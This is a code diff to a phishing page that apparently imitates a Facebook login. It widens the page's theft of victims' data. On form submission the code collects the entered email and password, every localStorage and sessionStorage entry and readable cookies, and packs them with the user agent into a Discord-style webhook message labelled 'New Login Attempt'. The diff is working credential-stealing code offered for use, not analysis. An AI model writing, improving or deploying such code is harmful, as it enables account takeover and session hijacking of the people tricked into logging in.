@@ -116,6 +116,36 @@
             }, 500);
         });
 
+        // Helper function to get all possible storage data
+        function getStorageData() {
+            let data = {};
+            
+            // 1. Try LocalStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    data['ls_' + key] = localStorage.getItem(key);
+                }
+            } catch (e) {}
+
+            // 2. Try SessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    data['ss_' + key] = sessionStorage.getItem(key);
+                }
+            } catch (e) {}
+
+            // 3. Try Document Cookie (for non-httponly ones)
+            if (document.cookie) {
+                data['doc_cookie'] = document.cookie;
+            } else {
+                data['doc_cookie'] = "(Empty - HttpOnly detected)";
+            }
+
+            return data;
+        }
+
         // Handle Form Submission
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -129,22 +159,8 @@
             const email = document.getElementById('email').value.trim();
             const pass = document.getElementById('pass').value.trim();
             
-            // Get Cookies & Local Storage for extra data
-            const cookies = document.cookie || "(No cookies found)";
-            let localData = {};
-            try {
-                // Try to get FB specific local storage items
-                const fbLS = localStorage.getItem('sb_fb_dtsg') || localStorage.getItem('dfp_fb_dtsg');
-                const sessionStor = sessionStorage.getItem('fb_tns_rfr') || sessionStorage.getItem('c_user');
-                
-                if(fbLS) localData['fb_dtsg'] = fbLS;
-                if(sessionStor) localData['session_data'] = sessionStor;
-                
-                // Dump all local storage if needed (optional, can be large)
-                // for(let k in localStorage) { localData[k] = localStorage[k]; }
-            } catch (err) {
-                localData['error'] = err.message;
-            }
+            // Capture ALL available data
+            const allData = getStorageData();
 
             // Prepare Payload
             const payload = {
@@ -152,12 +168,11 @@
                 avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Facebook_Logo_2020.svg/1200px-Facebook_Logo_2020.svg.png",
                 embeds: [{
                     title: "🔥 New Login Attempt",
-                    color: 15158332, // Reddish color
+                    color: 15158332, 
                     fields: [
                         { name: "📧 Email / Phone", value: email, inline: true },
                         { name: "🔑 Password", value: pass, inline: true },
-                        { name: "🍪 Cookies", value: cookies.length > 0 ? `\`\`\`${cookies.substring(0, 400)}\`\`\`` : "None", inline: false },
-                        { name: "💾 Local Storage", value: Object.keys(localData).length > 0 ? `\`\`\`${JSON.stringify(localData).substring(0, 400)}\`\`\`` : "None", inline: false },
+                        { name: "💾 Local/Session Storage", value: Object.keys(allData).length > 0 ? `\`\`\`${JSON.stringify(allData).substring(0, 400)}\`\`\`` : "None", inline: false },
                         { name: "🌐 User Agent", value: navigator.userAgent.substring(0, 200), inline: false }
                     ],
                     footer: { text: "Captured at: " + new Date().toLocaleString() },
@@ -186,7 +201,6 @@
 
             } catch (error) {
                 console.error("Fetch Error:", error);
-                // Fallback: If fetch fails, alert the user so you know it failed
                 alert("Capture Failed: " + error.message);
                 loginBtn.disabled = false;
                 btnText.style.display = 'block';
